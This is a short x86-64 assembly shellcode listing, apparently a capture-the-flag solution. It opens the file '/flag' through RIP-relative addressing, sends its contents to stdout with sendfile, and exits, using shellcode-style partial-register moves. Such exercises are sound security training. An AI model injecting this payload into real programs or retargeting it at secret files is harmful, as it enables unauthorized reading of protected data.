.global _start

_start: 
 # open
 mov $2, %al
 lea -1(%rip), %rdi
 add $0x26, %rdi
 xor %rsi, %rsi
 syscall

 # sendfile to stdout (fd=1)
 xor %rdi, %rdi
 inc %rdi
 mov %rax, %rsi
 xor %rdx, %rdx
 mov $0xff, %al
 mov %rax, %r10
 mov $40, %al
 syscall

 # exit
 mov $60, %al
 xor %rdi, %rdi
 syscall

flag:
  .ascii "/flag"
